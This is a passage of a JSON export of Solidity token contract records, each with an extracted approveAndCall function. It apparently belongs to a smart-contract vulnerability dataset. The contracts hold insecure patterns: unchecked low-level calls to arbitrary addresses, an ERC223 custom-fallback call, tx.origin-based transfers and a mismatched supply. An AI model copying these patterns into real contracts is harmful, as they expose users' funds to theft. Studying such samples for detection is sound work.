  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GateToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function GateToken() {\n balances[msg.sender] = 5000000000000000000000000000;\n totalSupply = 5000000000000000000000000000;\n name = \"GateToken\";\n decimals = 18;\n symbol = \"GATE\";\n unitsOneEthCanBuy = 100000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1589"
  },
  "filename": "34815.sol",
  "content": "contract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158a"
  },
  "filename": "34832.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Kemfe\";\n decimals = 5;\n symbol = \"kem\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158b"
  },
  "filename": "34856.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Aguris is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Aguris(\n ) {\n balances[msg.sender] = 102100000000000;\n totalSupply = 102100000000000;\n name = \"Aguris\";\n decimals = 8;\n symbol = \"AGS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158c"
  },
  "filename": "34873.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 12000000000000000000000000;\n totalSupply = 12000000000000000000000000;\n name = \"Ethereum Silver\";\n decimals = 18;\n symbol = \"ETS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158d"
  },
  "filename": "34914.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000;\n totalSupply = 1000000;\n name = \"Belfie Coin\";\n decimals = 0;\n symbol = \"BELF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158e"
  },
  "filename": "34938.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() internal {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Authorizable is Ownable {\n mapping(address => bool) public authorized;\n event AuthorizationSet(address indexed addressAuthorized, bool indexed authorization);\n function Authorizable() public {\n authorized[msg.sender] = true;\n }\n modifier onlyAuthorized() {\n require(authorized[msg.sender]);\n _;\n }\n function setAuthorized(address addressAuthorized, bool authorization) onlyOwner public {\n AuthorizationSet(addressAuthorized, authorization);\n authorized[addressAuthorized] = authorization;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transferFunction(address _sender, address _to, uint256 _value) internal returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_sender]);\n balances[_sender] = balances[_sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(_sender, _to, _value);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n return transferFunction(msg.sender, _to, _value);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC223TokenCompatible is BasicToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data);\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public returns (bool success) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if( isContract(_to) ) {\n _to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool success) {\n return transfer( _to, _value, _data, \"tokenFallback(address,uint256,bytes)\");\n }\n function isContract(address _addr) private view returns (bool is_contract) {\n uint256 length;\n assembly {\n length := extcodesize(_addr)\n }\n return (length>0);\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_to != address(this));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract Startable is Ownable, Authorizable {\n event Start();\n bool public started = false;\n modifier whenStarted() {\n require( started || authorized[msg.sender] );\n _;\n }\n function start() onlyOwner public {\n started = true;\n Start();\n }\n}\ncontract StartToken is Startable, ERC223TokenCompatible, StandardToken {\n function transfer(address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transfer(_to, _value);\n }\n function transfer(address _to, uint256 _value, bytes _data) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data);\n }\n function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenStarted returns (bool) {\n return super.transfer(_to, _value, _data, _custom_fallback);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenStarted returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenStarted returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenStarted returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenStarted returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract HumanStandardToken is StandardToken, StartToken {\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n approve(_spender, _value);\n require(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\n return true;\n }\n}\ncontract BurnToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burnFunction(address _burner, uint256 _value) internal returns (bool) {\n require(_value > 0);\n require(_value <= balances[_burner]);\n balances[_burner] = balances[_burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(_burner, _value);\n return true;\n }\n function burn(uint256 _value) public returns(bool) {\n return burnFunction(msg.sender, _value);\n }\n function burnFrom(address _from, uint256 _value) public returns (bool) {\n require(_value <= allowed[_from][msg.sender]);\n burnFunction(_from, _value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n return true;\n }\n}\ncontract OriginToken is Authorizable, BasicToken, BurnToken {\n function originTransfer(address _to, uint256 _value) onlyAuthorized public returns (bool) {\n return transferFunction(tx.origin, _to, _value);\n }\n function originBurn(uint256 _value) onlyAuthorized public returns(bool) {\n return burnFunction(tx.origin, _value);\n }\n}\ncontract ICOLandToken is ERC223TokenCompatible, StandardToken, StartToken, HumanStandardToken, BurnToken, OriginToken {\n uint8 public decimals = 18;\n string public name = \"ICOLand\";\n string public symbol = \"ICL\";\n uint256 public initialSupply;\n function ICOLandToken() public {\n totalSupply = 10000000 * 10 ** uint(decimals);\n initialSupply = totalSupply;\n balances[msg.sender] = totalSupply;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\napprove(_spender, _value);\nrequire(_spender.call(bytes4(keccak256(\"receiveApproval(address,uint256,bytes)\")), msg.sender, _value, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb158f"
  },
  "filename": "34959.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MertToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function MertToken(\n ) {\n balances[msg.sender] = 110000000;\n totalSupply = 110000000;\n name = \"MERT\";\n decimals = 0;\n symbol = \"MRT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1590"
  },
  "filename": "34973.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] =balances[_to].add(_value);\n balances[_from] =balances[_from].sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n contract MicroFinanceCoin is StandardToken {\n function () {\n throw;\n }\n string public name = 'MicroFinance Coin';\n uint8 public decimals = 18;\n string public symbol = 'MFC';\n string public version = 'V2.0';\n function MicroFinanceCoin(\n ) {\n balances[msg.sender] = 20000000000000000000000000;\n totalSupply = 99999997000000000000000000;\n name = \"MicroFinance Coin\";\n decimals = 18;\n symbol = \"MFC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1591"
  },
  "filename": "34987.sol",
